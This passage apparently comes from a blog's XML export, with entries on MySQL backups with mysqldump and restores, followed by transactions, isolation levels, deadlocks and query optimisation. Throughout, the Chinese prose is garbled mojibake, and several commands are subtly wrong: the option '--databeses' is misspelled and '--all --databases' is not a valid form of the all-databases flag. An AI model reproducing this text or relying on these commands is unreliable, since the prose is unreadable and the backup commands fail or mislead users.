    <content><![CDATA[<p><code>mysqldump</code> å‘½ä»¤å¯ä»¥å°†æ•°æ®åº“ä¸­çš„æ•°æ®å¤‡ä»½æˆä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ã€‚è¡¨çš„ç»“æ„å’Œè¡¨ä¸­çš„æ•°æ®å°†å­˜å‚¨åœ¨ç”Ÿæˆçš„æ–‡æœ¬æ–‡ä»¶ä¸­ã€‚</p>
<p>mysqldumpçš„å·¥ä½œåŸç†å°±æ˜¯æŸ¥å‡ºéœ€è¦å¤‡ä»½çš„æ•°æ®åº“å’Œè¡¨çš„ç»“æ„ï¼Œç„¶ååœ¨æ–‡æœ¬æ–‡ä»¶ä¸­ç”Ÿæˆç›¸åº”çš„ <code>create</code> å’Œ <code>insert</code> è¯­å¥ã€‚éœ€è¦å¯¼å…¥æ•°æ®åº“æ–‡ä»¶æ—¶ MySQL é€šè¿‡ä½¿ç”¨æ–‡æœ¬æ–‡ä»¶ä¸­è®°å½•çš„è¯­å¥ç”Ÿæˆç›¸åº”çš„æ•°æ®åº“å’Œè¡¨å°±å¯ä»¥äº†ã€‚</p>
<p>ä½¿ç”¨ <code>mysqldump</code> å‘½ä»¤è¿›è¡Œæ•°æ®å¤‡ä»½æ—¶ï¼Œç»å¸¸åˆ†ä¸ºä»¥ä¸‹3ç§å½¢å¼ï¼š</p>
<ol>
<li>å¤‡ä»½ä¸€ä¸ªæ•°æ®åº“</li>
<li>å¤‡ä»½å¤šä¸ªæ•°æ®åº“</li>
<li>å¤‡ä»½æ‰€æœ‰æ•°æ®åº“</li>
</ol>
<p>ä¸‹é¢åˆ†åˆ«ä»‹ç»ï¼š</p>
<h2 id="å¤‡ä»½ä¸€ä¸ªæ•°æ®åº“"><a href="#å¤‡ä»½ä¸€ä¸ªæ•°æ®åº“" class="headerlink" title="å¤‡ä»½ä¸€ä¸ªæ•°æ®åº“"></a>å¤‡ä»½ä¸€ä¸ªæ•°æ®åº“</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysqldump <span class="operator">-</span>u username <span class="operator">-</span>p dbname [table1 table2 ...] <span class="operator">&gt;</span> filename</span><br></pre></td></tr></table></figure>

<p>dbname ä¸ºæ•°æ®åº“åã€‚table1ã€table2 ä¸ºè¡¨åï¼Œæ²¡æœ‰æŒ‡å®š table æ—¶å°†å¤‡ä»½æ•´ä¸ªæ•°æ®åº“ã€‚filenameä¸ºæ–‡æœ¬æ–‡ä»¶åç§°ï¼Œé€šå¸¸ä½¿ç”¨<code>.sql</code>ä½œä¸ºåç¼€ã€‚</p>
<p>ä¾‹ï¼šå¤‡ä»½æ•°æ®åº“ users ä¸­çš„ studnets è¡¨åˆ° D ç›˜çš„ sql æ–‡ä»¶å¤¹ä¸‹ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysqldump <span class="operator">-</span>u root <span class="operator">-</span>p users  students <span class="operator">&gt;</span> D:\<span class="keyword">sql</span>\students.sql</span><br></pre></td></tr></table></figure>

<h2 id="å¤‡ä»½å¤šä¸ªæ•°æ®åº“"><a href="#å¤‡ä»½å¤šä¸ªæ•°æ®åº“" class="headerlink" title="å¤‡ä»½å¤šä¸ªæ•°æ®åº“"></a>å¤‡ä»½å¤šä¸ªæ•°æ®åº“</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysqldump <span class="operator">-</span>u username <span class="operator">-</span>p <span class="comment">--databeses dbname1 dbname2 &gt; filename</span></span><br></pre></td></tr></table></figure>

<p>åŠ ä¸Š <code>databases</code> é€‰é¡¹ï¼Œåé¢è·Ÿå¤šä¸ªæ•°æ®åº“åç§°</p>
<p>ä¾‹ï¼šå¤‡ä»½æ•°æ®åº“ usersã€customers åˆ° D ç›˜ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysqldump <span class="operator">-</span>u root <span class="operator">-</span>p <span class="comment">--databeses users customers &gt; data.sql</span></span><br></pre></td></tr></table></figure>

<h2 id="å¤‡ä»½æ‰€æœ‰æ•°æ®åº“"><a href="#å¤‡ä»½æ‰€æœ‰æ•°æ®åº“" class="headerlink" title="å¤‡ä»½æ‰€æœ‰æ•°æ®åº“"></a>å¤‡ä»½æ‰€æœ‰æ•°æ®åº“</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysqldump <span class="operator">-</span>u root <span class="operator">-</span>p <span class="comment">--all --databases &gt; filename</span></span><br></pre></td></tr></table></figure>

<h2 id="æ•°æ®æ¢å¤"><a href="#æ•°æ®æ¢å¤" class="headerlink" title="æ•°æ®æ¢å¤"></a>æ•°æ®æ¢å¤</h2><p>ä½¿ç”¨ <code>mysql</code> å‘½ä»¤è¿›è¡Œè¿˜åŸï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql <span class="operator">-</span>u root <span class="operator">-</span>p [dbname] <span class="operator">&lt;</span> filename</span><br></pre></td></tr></table></figure>

<p>dbname è¡¨ç¤ºæ•°æ®åº“åç§°ï¼Œè¯¥å‚æ•°æ˜¯å¯é€‰çš„ã€‚æŒ‡å®šæ•°æ®åº“åç§°æ—¶ï¼Œè¡¨ç¤ºè¿˜åŸè¯¥æ•°æ®åº“ä¸‹çš„è¡¨ï¼Œä¸æŒ‡å®šæ—¶è¡¨ç¤ºè¿˜åŸæ•°æ®åº“ã€‚</p>
<p>ä¹Ÿå¯ä»¥åœ¨è¿›å…¥ç›¸åº”æ•°æ®åº“åç”¨ <code>source</code> å‘½ä»¤æ¢å¤ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql&gt; use <span class="built_in">test</span>;</span><br><span class="line">mysql&gt; <span class="built_in">source</span> filename;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>æ•°æ®åº“</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQLä¹‹äº‹åŠ¡ä¸ä¼˜åŒ–</title>
    <url>/2018/06/03/%E3%80%8AMySQL%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A%E3%80%8B%E4%B9%8B%E4%BA%8B%E4%BB%B6%E4%B8%8E%E4%BC%98%E5%8C%96/</url>
    <content><![CDATA[<p>åœ¨ MySQL ä¸­ï¼Œäº‹åŠ¡ç”±ä¸€æ¡æˆ–å¤šæ¡ SQL è¯­å¥ç»„æˆï¼Œåœ¨è¿™ä¸ªäº‹åŠ¡ä¸­ï¼Œæ¯æ¡ MySQL è¯­å¥æ˜¯ç›¸äº’ä¾èµ–çš„ã€‚è€Œæ•´ä¸ªäº‹åŠ¡ä½œä¸ºä¸€ä¸ªä¸å¯åˆ†å‰²çš„æ•´ä½“ï¼Œä¸€æ—¦æŸæ¡ MySQL è¯­å¥æ‰§è¡Œå¤±è´¥æˆ–äº§ç”Ÿé”™è¯¯ï¼Œæ•´ä¸ªäº‹åŠ¡å°†ä¼šå›æ»šã€‚</p>
<p>åªæœ‰ <code>InnoDB</code> ç±»å‹çš„è¡¨æ”¯æŒäº‹åŠ¡ã€‚MySQLé»˜è®¤è¡¨ç±»å‹ä¸º <code>InnoDB</code>ã€‚</p>
<h2 id="äº‹åŠ¡çš„åŸºæœ¬è¦ç´ -ACID"><a href="#äº‹åŠ¡çš„åŸºæœ¬è¦ç´ -ACID" class="headerlink" title="äº‹åŠ¡çš„åŸºæœ¬è¦ç´ (ACID)"></a>äº‹åŠ¡çš„åŸºæœ¬è¦ç´ (ACID)</h2><ol>
<li>åŸå­æ€§ï¼ˆAtomicityï¼‰ï¼šäº‹åŠ¡å¼€å§‹åæ‰€æœ‰æ“ä½œï¼Œè¦ä¹ˆå…¨éƒ¨åšå®Œï¼Œè¦ä¹ˆå…¨éƒ¨ä¸åšï¼Œä¸å¯èƒ½åœæ»åœ¨ä¸­é—´ç¯èŠ‚ã€‚äº‹åŠ¡æ‰§è¡Œè¿‡ç¨‹ä¸­å‡ºé”™ï¼Œä¼šå›æ»šåˆ°äº‹åŠ¡å¼€å§‹å‰çš„çŠ¶æ€ï¼Œæ‰€æœ‰çš„æ“ä½œå°±åƒæ²¡æœ‰å‘ç”Ÿä¸€æ ·ã€‚ä¹Ÿå°±æ˜¯è¯´äº‹åŠ¡æ˜¯ä¸€ä¸ªä¸å¯åˆ†å‰²çš„æ•´ä½“ï¼Œå°±åƒåŒ–å­¦ä¸­å­¦è¿‡çš„åŸå­ï¼Œæ˜¯ç‰©è´¨æ„æˆçš„åŸºæœ¬å•ä½ã€‚</li>
<li>ä¸€è‡´æ€§ï¼ˆConsistencyï¼‰ï¼šäº‹åŠ¡å¼€å§‹å‰å’Œç»“æŸåï¼Œæ•°æ®åº“çš„å®Œæ•´æ€§çº¦æŸæ²¡æœ‰è¢«ç ´å ã€‚æ¯”å¦‚ A å‘ B è½¬è´¦ï¼Œä¸å¯èƒ½ A æ‰£äº†é’±ï¼ŒB å´æ²¡æ”¶åˆ°ã€‚</li>
<li>éš”ç¦»æ€§ï¼ˆIsolationï¼‰ï¼šæ¯ä¸ªäº‹åŠ¡åœ¨è‡ªå·±çš„ç©ºé—´å†…æ‰§è¡Œï¼Œä¸å…¶ä»–äº‹åŠ¡éš”ç¦»ï¼Œè€Œä¸”äº‹åŠ¡çš„ç»“æœåªæœ‰åœ¨å®ƒè¢«å®Œå…¨æ‰§è¡Œæ—¶æ‰èƒ½çœ‹åˆ°ã€‚è¿™æ ·å³ä½¿ä¸€ä¸ªç³»ç»ŸåŒæ—¶å‘ç”Ÿå¤šä¸ªäº‹ç‰©ï¼Œå­¤ç«‹æ€§ä¹Ÿå¯ä»¥ä¿è¯ç‰¹å®šçš„äº‹åŠ¡åœ¨å®Œæˆä¹‹å‰å…¶ç»“æœä¸è¢«å…¬å¸ƒã€‚</li>
<li>æŒä¹…æ€§ï¼ˆDurabilityï¼‰ï¼šäº‹åŠ¡æäº¤ä¹‹åï¼Œå°±ä¸€å®šæ˜¯åœ¨ç¡¬ç›˜æ°¸ä¹…çš„å­˜å‚¨ï¼Œè€Œä¸ä¼šä¸¢å¤±ã€‚</li>
</ol>
<h2 id="äº‹åŠ¡çš„åˆ›å»ºä¸å­˜åœ¨å‘¨æœŸ"><a href="#äº‹åŠ¡çš„åˆ›å»ºä¸å­˜åœ¨å‘¨æœŸ" class="headerlink" title="äº‹åŠ¡çš„åˆ›å»ºä¸å­˜åœ¨å‘¨æœŸ"></a>äº‹åŠ¡çš„åˆ›å»ºä¸å­˜åœ¨å‘¨æœŸ</h2><p>åˆ›å»ºäº‹åŠ¡çš„ä¸€èˆ¬è¿‡ç¨‹æ˜¯ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">åˆå§‹åŒ–äº‹åŠ¡ â€”â€”â€”â€”&gt; åˆ›å»ºäº‹åŠ¡ â€”â€”â€”â€”&gt; æäº¤æˆ–å›æ»š</span><br></pre></td></tr></table></figure>

<p><strong>æ— è®ºæœ€åæ˜¯æäº¤è¿˜æ˜¯å›æ»šï¼Œéƒ½ä¼šå…³é—­è¿™ä¸ªäº‹åŠ¡</strong>ã€‚  </p>
<ul>
<li>åˆå§‹åŒ–äº‹åŠ¡ï¼š<code>start transaction;</code> æˆ– <code>begin;</code>ï¼ŒMySQLé»˜è®¤æ˜¯<strong>è‡ªåŠ¨æäº¤</strong>çš„ï¼Œæ‰€ä»¥éœ€è¦ç”¨å‘½ä»¤æ”¹ä¸ºæ‰‹åŠ¨æ¨¡å¼</li>
<li>åˆ›å»ºäº‹åŠ¡ï¼šæ‰§è¡Œ SQ Lè¯­å¥</li>
<li>æäº¤æˆ–å›æ»šï¼š æäº¤ <code>commit;</code>ï¼Œå›æ»š <code>rollback;</code></li>
</ul>
<h2 id="äº‹åŠ¡çš„å¹¶å‘é—®é¢˜"><a href="#äº‹åŠ¡çš„å¹¶å‘é—®é¢˜" class="headerlink" title="äº‹åŠ¡çš„å¹¶å‘é—®é¢˜"></a>äº‹åŠ¡çš„å¹¶å‘é—®é¢˜</h2><ol>
<li>è„è¯»ï¼šäº‹åŠ¡ A è¯»å–äº†äº‹åŠ¡ B æ›´æ–°çš„æ•°æ®ï¼Œç„¶å B å›æ»šæ“ä½œï¼Œé‚£ä¹ˆAè¯»å–åˆ°çš„æ•°æ®æ˜¯è„æ•°æ®</li>
<li>ä¸å¯é‡å¤è¯»ï¼šäº‹åŠ¡ A å¤šæ¬¡è¯»å–åŒä¸€æ•°æ®ï¼Œäº‹åŠ¡ B åœ¨äº‹åŠ¡ A å¤šæ¬¡è¯»å–çš„è¿‡ç¨‹ä¸­ï¼Œå¯¹æ•°æ®ä½œäº†æ›´æ–°å¹¶æäº¤ï¼Œå¯¼è‡´äº‹åŠ¡ A å¤šæ¬¡è¯»å–åŒä¸€æ•°æ®æ—¶ç»“æœä¸ä¸€è‡´ã€‚</li>
<li>å¹»è¯»ï¼šç³»ç»Ÿç®¡ç†å‘˜ A å°†æ•°æ®åº“ä¸­æ‰€æœ‰å­¦ç”Ÿçš„æˆç»©ä»å…·ä½“åˆ†æ•°æ”¹ä¸º ABCDE ç­‰çº§ï¼Œä½†æ˜¯ç³»ç»Ÿç®¡ç†å‘˜ B å°±åœ¨è¿™ä¸ªæ—¶å€™æ’å…¥äº†ä¸€æ¡å…·ä½“åˆ†æ•°çš„è®°å½•ï¼Œå½“ç³»ç»Ÿç®¡ç†å‘˜ A æ”¹ç»“æŸåå‘ç°è¿˜æœ‰ä¸€æ¡è®°å½•æ²¡æœ‰æ”¹è¿‡æ¥ï¼Œå°±å¥½åƒå‘ç”Ÿäº†å¹»è§‰ä¸€æ ·ï¼Œè¿™å°±å«å¹»è¯»ã€‚</li>
</ol>
<p>å°ç»“ï¼šä¸å¯é‡å¤è¯»çš„å’Œå¹»è¯»å¾ˆå®¹æ˜“æ··æ·†ï¼Œä¸å¯é‡å¤è¯»ä¾§é‡äºä¿®æ”¹ï¼Œå¹»è¯»ä¾§é‡äºæ–°å¢æˆ–åˆ é™¤ã€‚è§£å†³ä¸å¯é‡å¤è¯»çš„é—®é¢˜åªéœ€é”ä½æ»¡è¶³æ¡ä»¶çš„è¡Œï¼Œè§£å†³å¹»è¯»éœ€è¦é”è¡¨</p>
<h2 id="äº‹åŠ¡çš„éš”ç¦»æ€§ç­‰çº§"><a href="#äº‹åŠ¡çš„éš”ç¦»æ€§ç­‰çº§" class="headerlink" title="äº‹åŠ¡çš„éš”ç¦»æ€§ç­‰çº§"></a>äº‹åŠ¡çš„éš”ç¦»æ€§ç­‰çº§</h2><p>äº‹åŠ¡å…·æœ‰éš”ç¦»çš„ç©ºé—´ã€‚åœ¨ MySQL æœåŠ¡å™¨ä¸­ï¼Œç”¨æˆ·é€šè¿‡ä¸åŒçš„ä¼šè¯æ‰§è¡Œä¸åŒçš„äº‹åŠ¡ï¼Œåœ¨å¤šç”¨æˆ·ç¯å¢ƒä¸­ï¼Œè®¸å¤š RDBMSï¼ˆå…³ç³»å‹æ•°æ®åº“ç®¡ç†ç³»ç»Ÿï¼‰ä¼šè¯åœ¨ä»»æ„æ—¶åˆ»éƒ½æ˜¯æ´»åŠ¨çš„ã€‚ä¸ºäº†ä½¿è¿™äº›äº‹åŠ¡äº’ä¸å½±å“ï¼Œä¿è¯æ•°æ®åº“æ€§èƒ½ä¸å—å½±å“ï¼Œé‡‡ç”¨äº‹åŠ¡çš„å­¤ç«‹ç­‰çº§æ˜¯å¾ˆé‡è¦çš„ã€‚</p>
<p>å¦‚æœæ²¡æœ‰å­¤ç«‹æ€§ï¼Œä¸åŒçš„æŸ¥è¯¢æ“ä½œä¼šåœ¨åŒä¸€äº‹åŠ¡çš„ç¯å¢ƒä¸­æ£€ç´¢åˆ°ä¸åŒçš„ç»“æœï¼Œè¿™å°†å¯¼è‡´æ•°æ®çš„ä¸ä¸€è‡´æ€§ã€‚</p>
<ol>
<li>åºåˆ—åŒ–(serializable)ï¼šä»¥åºåˆ—çš„å½¢å¼å¯¹äº‹åŠ¡è¿›è¡Œå¤„ç†ã€‚è¯¥å­¤ç«‹çº§çš„ç‰¹å®šæ˜¯åªæœ‰å½“äº‹åŠ¡æäº¤åï¼Œç”¨æˆ·æ‰èƒ½ä»æ•°æ®åº“ä¸ŠæŸ¥çœ‹æ•°æ®çš„å˜åŒ–ã€‚</li>
<li>å¯é‡è¯»(repeatale read)ï¼šäº‹åŠ¡åœ¨å­¤ç«‹çº§ä¸Šä¸ä¼šè¢«çœ‹æˆä¸€ä¸ªåºåˆ—ï¼Œä¸è¿‡åœ¨å½“å‰æ‰§è¡Œçš„äº‹åŠ¡è¿‡ç¨‹ä¸­ï¼Œç”¨æˆ·ä¾ç„¶çœ‹ä¸åˆ°äº‹åŠ¡çš„è¿‡ç¨‹ã€‚ç›´åˆ°äº‹åŠ¡æäº¤ä¸ºæ­¢ï¼Œç”¨æˆ·æ‰èƒ½çœ‹åˆ°äº‹åŠ¡çš„å˜åŒ–ç»“æœã€‚ï¼ˆå®¢æˆ·ç«¯ Aã€B åŒæ—¶å¼€å¯äº‹åŠ¡ï¼ŒB å‘è¡¨ä¸­æ’å…¥æ•°æ®è¡Œä¸”æäº¤åï¼ŒA åœ¨è‡ªå·±æäº¤å‰æ˜¯çœ‹ä¸åˆ°æ”¹å˜çš„ï¼‰ã€‚<strong>æ˜¯ MySQL çš„é»˜è®¤éš”ç¦»çº§åˆ«</strong>ã€‚  </li>
<li>è¯»å·²æäº¤(read committed)ï¼šè¯¥å­¤ç«‹çº§çš„å®‰å…¨æ€§æ¯”å¯é‡è¯»ä½ã€‚åœ¨è¿™ä¸€çº§äº‹åŠ¡ç”¨æˆ·å¯ä»¥çœ‹åˆ°å…¶ä»–äº‹åŠ¡æ·»åŠ åˆ°æ–°çºªå½•ã€‚åœ¨äº‹åŠ¡å¤„ç†æ—¶å¦‚æœå­˜åœ¨å…¶ä»–ç”¨æˆ·åŒæ—¶å¯¹äº‹åŠ¡çš„ç›¸åº”è¡¨è¿›è¡Œä¿®æ”¹é‚£ä¹ˆåœ¨åŒä¸€äº‹åŠ¡çš„ä¸åŒæ—¶é—´å†…ï¼ŒæŸ¥è¯¢æ“ä½œå¯èƒ½è¿”å›ä¸åŒçš„ç»“æœ(å®¢æˆ·ç«¯ Aã€B åŒæ—¶å¼€å¯äº‹åŠ¡ï¼ŒB å‘è¡¨ä¸­æ’å…¥æ•°æ®è¡Œä¸”æäº¤åï¼ŒA åœ¨è‡ªå·±æäº¤å‰å¯ä»¥çœ‹åˆ°æ”¹å˜)</li>
<li>è¯»æœªæäº¤(read uncommitted)ï¼šè¯¥å­¤ç«‹çº§æä¾›äº‹åŠ¡ä¹‹é—´æœ€å°ç¨‹åº¦é—´éš”ï¼Œè¯¥å­¤ç«‹çº§å®¹æ˜“äº§ç”Ÿå¹»è¯»ã€‚å…¶ä»–ç”¨æˆ·å¯ä»¥åœ¨è¯¥å­¤ç«‹çº§ä¸Šçœ‹åˆ°æœªæäº¤çš„äº‹åŠ¡ã€‚(å®¢æˆ·ç«¯ Aã€B åŒæ—¶å¼€å¯äº‹åŠ¡ï¼ŒB å‘è¡¨ä¸­æ’å…¥æ•°æ®è¡Œä¸”æœªæäº¤ï¼ŒA ä¹Ÿå¯ä»¥çœ‹åˆ°æ”¹å˜)</li>
</ol>
<table>
<thead>
<tr>
<th>å­¤ç«‹ç­‰çº§</th>
<th>è„è¯»</th>
<th>ä¸å¯é‡å¤è¯»</th>
<th>å¹»è¯»</th>
</tr>
</thead>
<tbody><tr>
<td>åºåˆ—åŒ–</td>
<td>å¦</td>
<td>å¦</td>
<td>å¦</td>
</tr>
<tr>
<td>å¯é‡è¯»</td>
<td>å¦</td>
<td>å¦</td>
<td>æ˜¯</td>
</tr>
<tr>
<td>è¯»å·²æäº¤</td>
<td>å¦</td>
<td>æ˜¯</td>
<td>æ˜¯</td>
</tr>
<tr>
<td>è¯»æœªæäº¤</td>
<td>æ˜¯</td>
<td>æ˜¯</td>
<td>æ˜¯</td>
</tr>
</tbody></table>
<p>ä¸å¯é‡å¤è¯»çš„é‡ç‚¹æ˜¯ä¿®æ”¹:åŒæ ·çš„æ¡ä»¶, ä½ è¯»å–è¿‡çš„æ•°æ®, å†æ¬¡è¯»å–å‡ºæ¥å‘ç°å€¼ä¸ä¸€æ ·äº†</p>
<p>å¹»è¯»çš„é‡ç‚¹åœ¨äºæ–°å¢æˆ–è€…åˆ é™¤ï¼šåŒæ ·çš„æ¡ä»¶, ç¬¬1æ¬¡å’Œç¬¬2æ¬¡è¯»å‡ºæ¥çš„è®°å½•æ•°ä¸ä¸€æ ·</p>
<p>ä»å­˜å‚¨å¼•æ“çš„è§’åº¦çœ‹ï¼Œè§£å†³ä¸å¯é‡å¤è¯»åªéœ€é”ä½å¯¹åº”è¡Œï¼Œè€Œè§£å†³å¹»è¯»éœ€è¦ä¿å­˜æ•°æ®åº“åœ¨äº‹åŠ¡å¼€å§‹å‰çš„å¿«ç…§ã€‚</p>
<p>è®¾ç½®äº‹åŠ¡çš„éš”ç¦»ç­‰çº§ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">set</span> transaction isolation level &#123;serializable <span class="operator">|</span> repeatable read <span class="operator">|</span> read committed <span class="operator">|</span> read uncommitted&#125;;</span><br></pre></td></tr></table></figure>

<h2 id="äº‹åŠ¡çš„æ€§èƒ½"><a href="#äº‹åŠ¡çš„æ€§èƒ½" class="headerlink" title="äº‹åŠ¡çš„æ€§èƒ½"></a>äº‹åŠ¡çš„æ€§èƒ½</h2><h3 id="åº”ç”¨å°äº‹åŠ¡"><a href="#åº”ç”¨å°äº‹åŠ¡" class="headerlink" title="åº”ç”¨å°äº‹åŠ¡"></a>åº”ç”¨å°äº‹åŠ¡</h3><p>åº”ç”¨å°äº‹åŠ¡çš„æ„ä¹‰åœ¨äºä¿è¯æ¯ä¸ªäº‹åŠ¡ä¸ä¼šåœ¨æ‰§è¡Œå‰ç­‰å¾…å¾ˆé•¿æ—¶é—´ï¼Œä»è€Œé¿å…å„ä¸ªäº‹åŠ¡å› ä¸ºäº’ç›¸ç­‰å¾…è€Œå¯¼è‡´ç³»ç»Ÿæ€§èƒ½å¤§å¹…åº¦ä¸‹é™ã€‚åº”å°½é‡ç¼©çŸ­ <code>insert</code>ã€<code>update</code> ç­‰æ“ä½œä¸ <code>commit</code> ä¹‹é—´çš„é—´éš”æ—¶é—´ã€‚</p>
<h3 id="åˆé€‚çš„å­¤ç«‹çº§"><a href="#åˆé€‚çš„å­¤ç«‹çº§" class="headerlink" title="åˆé€‚çš„å­¤ç«‹çº§"></a>åˆé€‚çš„å­¤ç«‹çº§</h3><p>äº‹åŠ¡çš„æ€§èƒ½ä¸å…¶å¯¹æœåŠ¡å™¨äº§ç”Ÿçš„è´Ÿè½½æˆåæ¯”ï¼Œå³äº‹åŠ¡å­¤ç«‹çº§è¶Šé«˜ï¼Œå…¶æ€§èƒ½è¶Šä½ã€‚ä¾‹å¦‚åºåˆ—åŒ–è™½ç„¶å¾ˆç¨³å®šï¼Œä½†æ˜¯ä¼šå¤§å¤§å½±å“ MySQL çš„æ€§èƒ½ï¼Œç”Ÿäº§ä¸­æ¯”è¾ƒå°‘ç”¨ï¼Œè€Œç”¨ä¹è§‚é”æ‚²è§‚é”è§£å†³å¹»è¯»ç­‰é—®é¢˜</p>
<h3 id="æ­»é”"><a href="#æ­»é”" class="headerlink" title="æ­»é”"></a>æ­»é”</h3><p>å½“ä¸¤ä¸ªæˆ–å¤šä¸ªå¤„äºä¸åŒåºåˆ—çš„ç”¨æˆ·æ‰“ç®—åŒæ—¶æ›´æ–°æŸç›¸åŒæ•°æ®åº“æ—¶ï¼Œå› äº’ç›¸ç­‰å¾…å¯¹æ–¹é‡Šæ”¾æƒé™è€Œå¯¼è‡´åŒæ–¹ä¸€ç›´å¤„äºç­‰å¾…çŠ¶æ€ã€‚ä¸¤ä¸ªä¸åŒåºåˆ—çš„å®¢æˆ·ç«¯åŒæ—¶å¯¹æ•°æ®æ‰§è¡Œæ“ä½œææœ‰å¯èƒ½äº§ç”Ÿæ­»é”ã€‚æ›´é€šä¿—åœ°è®²ï¼Œå½“ä¸¤ä¸ªäº‹ç‰©ç›¸äº’ç­‰å¾…æ“ä½œå¯¹æ–¹é‡Šæ”¾æ‰€æŒæœ‰çš„èµ„æºè€Œå¯¼è‡´ä¸¤ä¸ªäº‹åŠ¡éƒ½æ— æ³•æ“ä½œå¯¹æ–¹æŒæœ‰çš„èµ„æºï¼Œè¿™æ ·æ— é™æœŸçš„ç­‰å¾…ç§°ä¸ºæ­»é”ã€‚</p>
<p>InnoDBå…·æœ‰æ£€æŸ¥æ­»é”çš„åŠŸèƒ½ã€‚å¦‚æœå‘ç°äº§ç”Ÿäº†æ­»é”ï¼ŒInnoDBä¼šç«‹åˆ»æ’¤é”€å…¶ä¸­ä¸€ä¸ªä»»åŠ¡ä»¥ä¾¿æ­»é”æ¶ˆå¤±ã€‚è¿™æ ·å°±å¯ä»¥ä½¿å¦ä¸€ä¸ªäº‹åŠ¡è·å–å¯¹æ–¹æ‰€å æœ‰çš„èµ„æºè€Œæ‰§è¡Œæ“ä½œé€»è¾‘ã€‚</p>
<h2 id="ä¼˜åŒ–æ•°æ®åº“"><a href="#ä¼˜åŒ–æ•°æ®åº“" class="headerlink" title="ä¼˜åŒ–æ•°æ®åº“"></a>ä¼˜åŒ–æ•°æ®åº“</h2><ul>
<li>ä½¿ç”¨ç´¢å¼•.<strong>å¯¹äºæ–°è¡¨å¯ä»¥å…ˆä¸åˆ›å»ºç´¢å¼•ï¼Œç­‰æ•°æ®å¯¼å…¥ååœ¨åˆ›å»ºï¼Œè¿™æ ·å¯ä»¥æé«˜æ•°æ®å¯¼å…¥æ•ˆç‡</strong>ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œç´¢å¼•åº”å»ºç«‹åœ¨é‚£äº›å°†ç”¨äº JOIN, WHERE åˆ¤æ–­å’Œ ORDER BY æ’åºçš„å­—æ®µä¸Šã€‚å°½é‡ä¸è¦å¯¹æ•°æ®åº“ä¸­æŸä¸ªå«æœ‰å¤§é‡é‡å¤çš„å€¼çš„å­—æ®µå»ºç«‹ç´¢å¼•ã€‚å¯¹äºä¸€ä¸ªENUMç±»å‹çš„å­—æ®µæ¥è¯´ï¼Œå‡ºç°å¤§é‡é‡å¤å€¼æ˜¯å¾ˆæœ‰å¯èƒ½çš„æƒ…å†µ</li>
<li>å°½é‡å°‘ç”¨ <code>like</code> è¯­å¥ä¸é€šé…ç¬¦ <code>%</code></li>
<li>é€‰å–æœ€åˆé€‚çš„å­—æ®µå¤§å°ã€‚è¡¨è¶Šå°ï¼Œé€Ÿåº¦è¶Šå¿«ã€‚æ‰€ä»¥èƒ½ç”¨ <code>char</code> å°±ä¸è¦ç”¨ <code>varchar</code> ï¼Œèƒ½ç”¨ <code>mediumint</code> å°±ä¸ç”¨ <code>bigint</code>ã€‚<strong>å°½é‡ä½¿ç”¨ <code>not null</code> è¿™æ ·åœ¨æŸ¥è¯¢æ—¶æ•°æ®åº“ä¸ç”¨å»æ¯”è¾ƒnullå€¼ã€‚</strong></li>
<li>ç”¨ <code>join</code> ä»£æ›¿å­æŸ¥è¯¢ã€‚è¿™æ · MySQL ä¸éœ€è¦åœ¨å†…å­˜ä¸­åˆ›å»ºä¸´æ—¶è¡¨æ¥å®Œæˆé€»è¾‘ä¸Šçš„éœ€è¦ä¸¤ä¸ªæ­¥éª¤çš„æŸ¥è¯¢å·¥ä½œã€‚ã€‚</li>
<li>ä¼˜åŒ– insert è¯­å¥ã€‚ä¸€æ¬¡æ’å…¥å¤šæ¡æ•°æ®æ¯”æ¯æ¬¡æ’å…¥ä¸€æ¡æ•°æ®å¿«ã€‚èƒ½ç”¨ <code>union</code> å°†å¤šæ¡ <code>select</code> ç»“åˆå°±ä¸è¦å•ç‹¬ç”¨å¤šæ¬¡ <code>select</code></li>
<li>ä½¿ç”¨äº‹åŠ¡ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å­æŸ¥è¯¢ã€è¿æ¥ï¼ˆJOINï¼‰å’Œè”åˆï¼ˆUNIONï¼‰æ¥åˆ›å»ºå„ç§å„æ ·çš„æŸ¥è¯¢ï¼Œä½†ä¸æ˜¯æ‰€æœ‰çš„æ•°æ®åº“æ“ä½œéƒ½å¯ä»¥åªç”¨ä¸€æ¡æˆ–å°‘æ•°å‡ æ¡ SQL è¯­å¥å°±å¯ä»¥å®Œæˆçš„ã€‚æ›´å¤šçš„æ—¶å€™æ˜¯éœ€è¦ç”¨åˆ°ä¸€ç³»åˆ—çš„è¯­å¥æ¥å®ŒæˆæŸç§å·¥ä½œã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå½“è¿™ä¸ªè¯­å¥å—ä¸­çš„æŸä¸€æ¡è¯­å¥è¿è¡Œå‡ºé”™çš„æ—¶å€™ï¼Œæ•´ä¸ªè¯­å¥å—çš„æ“ä½œå°±ä¼šå˜å¾—ä¸ç¡®å®šèµ·æ¥ã€‚è¿™æ—¶å€™å°±è¦ç”¨åˆ°äº‹åŠ¡ã€‚</li>
